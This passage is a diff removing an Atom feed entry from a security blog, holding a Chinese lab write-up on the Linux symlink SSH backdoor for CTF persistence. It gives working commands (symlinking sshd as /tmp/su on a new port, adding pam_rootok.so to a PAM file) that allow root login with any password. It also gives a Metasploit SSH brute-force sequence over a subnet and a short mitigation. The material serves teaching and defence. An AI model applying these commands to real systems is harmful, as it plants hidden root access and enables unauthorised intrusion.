       <category term="生活" scheme="https://alem0n.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Linux软连接后门</title>
-    <link href="https://alem0n.github.io/2018/11/09/Linux%E8%BD%AF%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8-2018/"/>
-    <id>https://alem0n.github.io/2018/11/09/Linux软连接后门-2018/</id>
-    <published>2018-11-09T02:00:00.000Z</published>
-    <updated>2019-05-21T03:34:42.227Z</updated>
-    
-    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>记录一次Linux软连接后门实验过程，ctf攻防中可用做维持</p><a id="more"></a><h3 id="一、实验过程："><a href="#一、实验过程：" class="headerlink" title="一、实验过程："></a>一、实验过程：</h3><h5 id="1、在靶机执行并查看是否软连接建立完成："><a href="#1、在靶机执行并查看是否软连接建立完成：" class="headerlink" title="1、在靶机执行并查看是否软连接建立完成："></a>1、在靶机执行并查看是否软连接建立完成：</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345</span><br><span class="line">netstat -tunlp | grep 12345</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh1.png" alt="ssh后门1"></p><h5 id="2、在攻击机利用ssh并使用任意密码登陆靶机"><a href="#2、在攻击机利用ssh并使用任意密码登陆靶机" class="headerlink" title="2、在攻击机利用ssh并使用任意密码登陆靶机"></a>2、在攻击机利用ssh并使用任意密码登陆靶机</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.86.135 -p 12345</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh10.png" alt="ssh后门2"></p><h5 id="3、如果被控制端的root禁止ssh登录，那么也可以用被控制端的其他用户登录"><a href="#3、如果被控制端的root禁止ssh登录，那么也可以用被控制端的其他用户登录" class="headerlink" title="3、如果被控制端的root禁止ssh登录，那么也可以用被控制端的其他用户登录"></a>3、如果被控制端的root禁止ssh登录，那么也可以用被控制端的其他用户登录</h5><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh11.png" alt="ssh后门3"></p><h3 id="二、防范"><a href="#二、防范" class="headerlink" title="二、防范"></a>二、防范</h3><h5 id="1、修改配置文件"><a href="#1、修改配置文件" class="headerlink" title="1、修改配置文件"></a>1、修改配置文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">UsePAM no</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh12.png" alt="ssh后门4"></p><h5 id="2、重载ssh配置文件"><a href="#2、重载ssh配置文件" class="headerlink" title="2、重载ssh配置文件"></a>2、重载ssh配置文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/sshd reload</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh13.png" alt="ssh后门5"></p><h5 id="3、验证，使用任意密码无法登陆，使用正确密码可以登录"><a href="#3、验证，使用任意密码无法登陆，使用正确密码可以登录" class="headerlink" title="3、验证，使用任意密码无法登陆，使用正确密码可以登录"></a>3、验证，使用任意密码无法登陆，使用正确密码可以登录</h5><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh14.png" alt="ssh后门6"></p><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh15.png" alt="ssh后门7"></p><h3 id="三、延伸"><a href="#三、延伸" class="headerlink" title="三、延伸"></a>三、延伸</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此类ssh后门的核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能,默认的配置文件中出来su，是否还有其他的可利用的配置文件</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">echo "auth sufficient pam_rootok.so" &gt;&gt; /etc/pam.d/hacker</span><br><span class="line">cat /etc/pam.d/hacker</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=2333</span><br><span class="line">netstat  -tunlp | grep 2333</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh16.png" alt="ssh后门8"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机：</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh17.png" alt="ssh后门9"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">实践表明通过软连接文件名指定ssh的pam配置文件为hacker,只要文件中包含&quot;auth sufficient pam_rootok.so&quot;即可无密码登陆</span><br><span class="line"></span><br><span class="line">最后在etc/pam.d/目录下查找包含pam_rootok.so配置的文件</span><br></pre></td></tr></table></figure><h3 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h3><h5 id="1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用"><a href="#1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用" class="headerlink" title="1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用"></a><code>1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用</code></h5><h5 id="2、如果被控主机不允许root登陆可用其他已存在用户登陆"><a href="#2、如果被控主机不允许root登陆可用其他已存在用户登陆" class="headerlink" title="2、如果被控主机不允许root登陆可用其他已存在用户登陆"></a><code>2、如果被控主机不允许root登陆可用其他已存在用户登陆</code></h5><h5 id="3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：-tmp-su-home-su）在-etc-pam-d-目录下寻找对应的PAM配置文件-如：-etc-pam-d-su"><a href="#3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：-tmp-su-home-su）在-etc-pam-d-目录下寻找对应的PAM配置文件-如：-etc-pam-d-su" class="headerlink" title="3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)"></a><code>3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)</code></h5><h5 id="4、任意密码登陆的核心是auth-sufficient-pam-rootok-so-只要PAM配置文件中包含此配置即可-SSH任意密码登陆"><a href="#4、任意密码登陆的核心是auth-sufficient-pam-rootok-so-只要PAM配置文件中包含此配置即可-SSH任意密码登陆" class="headerlink" title="4、任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆"></a><code>4、任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆</code></h5><h3 id="五、msf相应ssh登陆模块"><a href="#五、msf相应ssh登陆模块" class="headerlink" title="五、msf相应ssh登陆模块"></a>五、msf相应ssh登陆模块</h3><h4 id="1、批量ssh登录：用msf的ssh登录模块"><a href="#1、批量ssh登录：用msf的ssh登录模块" class="headerlink" title="1、批量ssh登录：用msf的ssh登录模块"></a>1、批量ssh登录：用msf的ssh登录模块</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.10-100.1</span><br><span class="line"></span><br><span class="line">set username root</span><br><span class="line"></span><br><span class="line">set password 123456</span><br><span class="line"></span><br><span class="line">run/exploit</span><br><span class="line"></span><br><span class="line">sessions  // 查看成功登录的会话，</span><br><span class="line"></span><br><span class="line">sessions  -i // 打开某个会话</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;记录一次Linux软连接后门实验过程，ctf攻防中可用做维持&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="https://alem0n.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="Linux" scheme="https://alem0n.github.io/tags/Linux/"/>
-    
-      <category term="渗透测试" scheme="https://alem0n.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
